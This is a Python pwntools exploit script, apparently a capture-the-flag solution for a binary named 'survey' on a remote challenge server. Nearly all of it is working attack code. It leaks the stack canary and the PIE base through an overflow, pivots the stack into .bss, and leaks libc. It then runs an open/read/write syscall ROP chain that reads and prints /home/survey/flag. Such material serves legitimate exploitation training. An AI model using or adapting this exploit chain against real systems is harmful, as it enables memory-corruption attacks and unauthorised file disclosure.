from pwn import *
context.arch = "amd64"

# Addr
'''
readelf -a /lib64/libc-2.32.so | grep 'system'
readelf -a /lib/x86_64-linux-gnu/libc-2.29.so | grep 'system'
'''
# libc
libc_start_offset = 0x26a80
system_offset = 0x52fd0 
bin_sh_offset = 0x1AFB84
printf_offset = 0x62830
gets_offset =  0x832f0

# user code
main_offset = 0x1214
main_body_offset = 0x1235
data_offset = 0x4000
bss_start_offset = 0x40F0
# bss: 0x4000 ~ 0x5000
bss_offset = 0x4d00
# bss_offset = 0x40F9
hello_offset = 0x2030
secc_offset = 0x2008

'''
ROPgadget --binary=/lib/x86_64-linux-gnu/libc-2.29.so | grep 'pop'
ROPgadget --binary=/lib/x86_64-linux-gnu/libc-2.29.so --multibr | grep "syscall ; ret"
ROPgadget --binary=/home/survey/survey | grep 'leave'
'''
# ROPgadget
# libc
L_nop = 0x1
L_pop_rdi_offset = 0x26542
L_pop_rsi_offset = 0x26f9e
L_pop_rdx_offset = 0x12bda6
L_pop_rax_offset = 0x47cf8
L_syscall_offset = 0xcf6c5
# user code
pop_rdi_offset = 0x1353
leave_offset = 0x12e1

# Test
canary = p64(0)
libc_base = 0x00

# Exploit
r = remote('140.112.31.97', 30201)
# r = process('./home/survey/survey')

################################

# Leak code base
r.sendafter('name :', 'a'*0x19)
r.recvuntil('a'*0x19)
canary = b'\x00' + r.recv(7)
PIE =  r.recv(6)  + b'\x00\x00' 
print('canary:', hex(u64(canary)))
print('PIE:', hex(u64(PIE)))
'''
$ p/x 0x55c4c01b12f0 - 0x000055c4c01b0000
$1 = 0x12f0
'''
PIE_offset = 0x12f0
base = u64(PIE) - PIE_offset
print('base:', hex(base))

# Calculate address
main = p64(base + main_offset)
main_body = p64(base + main_body_offset)
data = p64(base + data_offset)
bss = p64(base + bss_offset)

pop_rdi = p64(base + pop_rdi_offset)
leave = p64(base + leave_offset)
hello =  p64(base + hello_offset)
secc =  p64(base + secc_offset)

print('main:', hex(u64(main)))
print('main_body:', hex(u64(main_body)))
print('data:', hex(u64(data)))
print('bss:', hex(u64(bss)))

# ROP stack pivot
input('---ready to send to stack pivot, rbp to bss')
padding = b'a' * 0x18
canary = canary
fakerbp = bss
ROPchain = main_body

payload = padding + canary + fakerbp + ROPchain

r.sendafter('here : ', payload)

################################

# nothing
input('---after stack pivot, ready to send nothing to leave address in bss. ---')
r.sendafter('name :', 'a'*5)
# $ search-pattern aaaaa

# ROP stack pivot
input('---ready to stack pivot again---')
padding = b'a' * 0x18
canary = canary
fakerbp = bss
ROPchain = main_body

payload = padding + canary + fakerbp + ROPchain

r.sendafter('here : ', payload)

################################

# Leak libc
input(f'---after stack pivot. TODO: check bss {hex(u64(bss))} with gdb before continue. ex: x/40g {hex(u64(bss))}-0x100 ---')
input('---ready to leak libc in bss---')
r.sendafter('name :', 'a'*0x1)
r.recvuntil('Hello, ')
output = r.recv(20)
print('output:', output)
libc_body_addr = u64(output[:6] + b'\x00\x00')
print('libc_body_addr:', hex(libc_body_addr))

# TODO: gdb to find it.
libc_body_offset = 0x1e6561
# libc_start_addr = libc_unknown_addr - libc_unknown_offset
libc_base = libc_body_addr - libc_body_offset
print('libc_base:', hex(libc_base))

# Calculate address
# pop_rdi = p64(libc_base + L_pop_rdi)
bin_sh = p64(libc_base + bin_sh_offset) 
system = p64(libc_base + system_offset)
printf = p64(libc_base + printf_offset)
gets = p64(libc_base + gets_offset)
L_pop_rdi = p64(libc_base + L_pop_rdi_offset) 
L_pop_rsi = p64(libc_base + L_pop_rsi_offset) 
L_pop_rdx = p64(libc_base + L_pop_rdx_offset) 
L_pop_rax = p64(libc_base + L_pop_rax_offset) 
L_syscall = p64(libc_base + L_syscall_offset) 

# ROP stack pivot
input('---after leaking libc_base, ready to stack pivot to long ROP chain---')
gets_input = p64(base + bss_offset - 0x08) 

ROPchain2_addr = p64(base + bss_offset - 0x20)  
fakerbp2_addr = p64(base + bss_offset - 0x28) 

fakerbp2 = p64(base + bss_offset + 0x50) 
ROPchain2 = pop_rdi + gets_input + gets
# ROPchain2 = pop_rdi + bin_sh + system
canary = canary
fakerbp = fakerbp2_addr 
ROPchain = leave

payload = ROPchain2 + canary + fakerbp + ROPchain

r.sendafter('here : ', payload)

################################

# ROP stack pivot
input(f'---after stack pivot, ready to open read write, check ROPchain ex: x/40g {hex(u64(gets_input))} --')

print_hello = pop_rdi + hello + printf
print_secc = pop_rdi + secc + printf

# ROPchain = print_secc
# Put the flag's location string at a known place on the bss
# Using gdb, the flag's location string will be at bss+0xc0

# ROP to open the flag file
# Flag file's file descriptor will be 3
# rax=2 open(filename, flags, mode)
ROPchain = L_pop_rdi + p64(base + bss_offset + 0xc0)
ROPchain += L_pop_rsi + p64(0)
ROPchain += L_pop_rax + p64(2)
ROPchain += L_syscall

# ROP to read the flag file's contents right into bss
# rax=0 read(fd, buf, count)
ROPchain += L_pop_rdi + p64(3)
ROPchain += L_pop_rsi + bss
ROPchain += L_pop_rdx + p64(0x100)
ROPchain += L_pop_rax + p64(0)
ROPchain += L_syscall

# ROP to write the contents of bss right into stdout
# rax=1 write(fd, buf, count)
ROPchain += L_pop_rdi + p64(1)
ROPchain += L_pop_rsi + bss
ROPchain += L_pop_rdx + p64(0x100)
ROPchain += L_pop_rax + p64(1)
ROPchain += L_syscall

ROPchain += b'/home/survey/flag'.ljust(0x20, b'\x00')

payload = ROPchain

r.sendline(payload)

r.interactive()

'''
open -> read -> write

open "/home/survey/flag", return file fd
read file fd to buffer
write buffer to STDOUT
'''